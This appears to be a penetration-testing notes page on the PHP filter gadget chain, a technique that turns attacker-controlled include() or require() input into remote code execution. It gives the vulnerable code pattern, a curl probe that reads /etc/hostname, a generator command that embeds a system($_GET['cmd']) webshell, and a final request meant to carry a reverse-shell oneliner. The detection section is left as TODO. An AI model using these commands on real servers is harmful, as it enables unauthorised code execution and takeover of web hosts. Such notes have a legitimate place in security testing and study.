
# PHP Filter Gadget Chain
## Summary

A PHP Filter Gadget Chain is a technique used to obtain PHP code execution against a PHP-enabled web server, when the attacker is able to control the input to a require() or include() function call.

## Prerequisites

A PHP enabled web server, alongside some vulnerable code.

## Setup

Either of the following function calls are vulnerable to this attack. As long as the attacker-controlled input is not mangled too heavily prior to the include or require function calls, then this attack should still work. Ideally the input is not mangled at all.

```php
include($_GET['page'])
# OR
require($_GET['page'])
```

The chain requires that `extension=iconv` is set in the php.ini file, this is usually `/etc/php/php.ini`

This can be tested by performing the following request to see if any output is produced:

```bash
curl http://ip/index.php?page=php://filter/convert.base64-encode/resource=/etc/hostname
```

If the base64 encoded hostname is rendered to the site, then this RCE is possible.

## Execution

### Method 1 - PHP Filter Gadget Chain Generator

Using [this](https://github.com/synacktiv/php_filter_chain_generator) repository, and any PHP code that can lead to code execution on the target (see [Basic PHP Webshell Oneliner](./php_webshell_oneline.md)), the following command can be used to exploit the target:

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' | tail -n1
```

![gadget chain](./images/Pasted%20image%2020230706230434.png)

Then, it's possible to run commands by using the following command:

```bash
curl http://ip/index.php?page=<gadget chain>&cmd=<reverse shell oneliner>
```

#### Indicators of Compromise

TODO
